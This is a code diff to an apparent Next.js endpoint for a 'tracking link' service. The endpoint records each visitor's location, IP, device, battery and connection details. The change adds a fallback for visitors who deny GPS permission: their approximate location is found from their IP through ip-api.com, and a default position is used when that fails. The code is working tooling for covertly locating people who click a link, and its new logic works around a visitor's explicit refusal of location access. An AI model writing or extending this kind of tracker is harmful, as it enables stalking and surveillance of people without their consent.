@@ -16,16 +16,9 @@ export async function POST(request, { params }) {
       speed,
       screenResolution,
       battery,
-      connectionType
+      connectionType,
+      isGpsDenied
     } = body;
-
-    if (latitude === undefined || longitude === undefined) {
-      return NextResponse.json({ success: false, message: 'Koordinat latitude dan longitude wajib diisi' }, { status: 400 });
-    }
-
-    const lat = parseFloat(latitude);
-    const lng = parseFloat(longitude);
-    const acc = parseFloat(accuracy || 0);
 
     const link = store.getLinkById(id);
 
@@ -33,27 +26,84 @@ export async function POST(request, { params }) {
     const forwarded = request.headers.get('x-forwarded-for');
     const realIp = request.headers.get('x-real-ip');
     let ip = forwarded ? forwarded.split(',')[0].trim() : (realIp || '127.0.0.1');
-    if (ip === '::1' || ip === '127.0.0.1') ip = '127.0.0.1 (Localhost)';
+    const isLocalhost = ip === '::1' || ip === '127.0.0.1';
 
     // Device parsing
     const userAgent = request.headers.get('user-agent') || '';
     const deviceInfo = parseUserAgent(userAgent);
 
-    // Reverse Geocode to street / district / city
-    const geoDetails = await reverseGeocode(lat, lng);
+    let lat = latitude !== undefined && latitude !== null ? parseFloat(latitude) : null;
+    let lng = longitude !== undefined && longitude !== null ? parseFloat(longitude) : null;
+    let acc = accuracy !== undefined && accuracy !== null ? parseFloat(accuracy) : 5000;
+    const isGps = lat !== null && lng !== null && !isGpsDenied;
+    let geoDetails = null;
+
+    if (!isGps) {
+      // Fallback: Lookup IP Location using free ip-api.com
+      try {
+        const queryIp = isLocalhost ? '' : ip;
+        const geoRes = await fetch(
+          `http://ip-api.com/json/${queryIp}?fields=status,country,regionName,city,lat,lon,isp,query`,
+          { signal: AbortSignal.timeout(4000) }
+        );
+        const geoData = await geoRes.json();
+
+        if (geoData.status === 'success') {
+          lat = geoData.lat;
+          lng = geoData.lon;
+          acc = 3000;
+          if (isLocalhost && geoData.query) ip = geoData.query;
+
+          geoDetails = {
+            road: `Perkiraan via ISP: ${geoData.isp || 'Jaringan Seluler'}`,
+            village: '-',
+            district: '-',
+            city: geoData.city || 'Kota Terdeteksi',
+            state: geoData.regionName || '-',
+            country: geoData.country || 'Indonesia',
+            isp: geoData.isp || '-',
+            isIpFallback: true,
+            full_address: `Perkiraan Area: ${geoData.city}, ${geoData.regionName} (${geoData.isp || 'Provider Jaringan'})`
+          };
+        }
+      } catch (err) {
+        console.warn('IP fallback lookup error:', err.message);
+      }
+    } else {
+      // Reverse Geocode exact GPS coordinates
+      geoDetails = await reverseGeocode(lat, lng);
+    }
+
+    // Default fallback if both GPS and IP lookup fail
+    if (lat === null || lng === null) {
+      lat = -6.2088; // Default fallback to center of Indonesia / Jakarta
+      lng = 106.8456;
+      acc = 10000;
+      geoDetails = {
+        road: 'Lokasi Berdasarkan Jaringan Seluler',
+        village: '-',
+        district: '-',
+        city: 'Indonesia',
+        state: '-',
+        country: 'Indonesia',
+        full_address: 'Lokasi kasar berdasarkan IP jaringan seluler'
+      };
+    }
 
     const logEntry = {
       linkId: link ? link.id : id,
       linkTitle: link ? link.title : 'Link Pelacak',
       preset: link ? link.preset : 'maps',
+      trackingMethod: isGps ? 'GPS Presisi' : 'IP Jaringan (Perkiraan)',
+      isGpsDenied: !isGps,
       coordinates: {
         latitude: lat,
         longitude: lng,
         accuracy: acc,
-        altitude: altitude !== null ? altitude : null,
-        altitudeAccuracy: altitudeAccuracy !== null ? altitudeAccuracy : null,
-        heading: heading !== null ? heading : null,
-        speed: speed !== null ? speed : null
+        altitude: altitude !== null && altitude !== undefined ? altitude : null,
+        altitudeAccuracy: altitudeAccuracy !== null && altitudeAccuracy !== undefined ? altitudeAccuracy : null,
+        heading: heading !== null && heading !== undefined ? heading : null,
+        speed: speed !== null && speed !== undefined ? speed : null
       },
       address: geoDetails,
       device: {
@@ -71,8 +121,9 @@ export async function POST(request, { params }) {
 
     return NextResponse.json({
       success: true,
-      message: 'Lokasi berhasil dicatat dan diproses',
+      message: isGps ? 'Koordinat GPS presisi berhasil dicatat' : 'Perkiraan lokasi IP berhasil dicatat (Fallback)',
       logId: savedLog.id,
+      isGps,
       address: geoDetails
     });
   } catch (error) {
